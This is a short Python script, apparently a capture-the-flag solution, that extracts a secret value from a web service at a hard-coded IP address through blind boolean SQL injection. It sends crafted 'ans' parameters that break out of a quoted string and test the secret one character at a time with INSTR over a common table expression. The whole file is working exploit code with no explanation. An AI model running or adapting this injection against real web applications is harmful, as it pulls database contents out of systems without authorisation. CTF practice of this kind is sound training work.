import requests

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
ALPHABET = ALPHABET.lower() + "0123456789" + "_+@!}/?&-" + ALPHABET
FLAG = "https://drive.google.com/file/d/1KWvSVho_Yl6kQ2f6iwGPudfh2pYPvDN1/"

while not FLAG.endswith("}"):
  for c in ALPHABET:
    TEMP_FLAG = FLAG + c
    print(f"Trying {TEMP_FLAG}")
    d = requests.get(f"http://20.198.223.134:1301/?id=1301&ans='or(INSTR((with`cte`(c1,c2,c3)AS(SELECT*FROM(QuiBuu))SELECT(c3)from(cte)WHERE(c1)=1337),'{TEMP_FLAG}')==1)or'123'='")

    if "haha" in d.text.lower():
      FLAG = TEMP_FLAG
      print(FLAG)
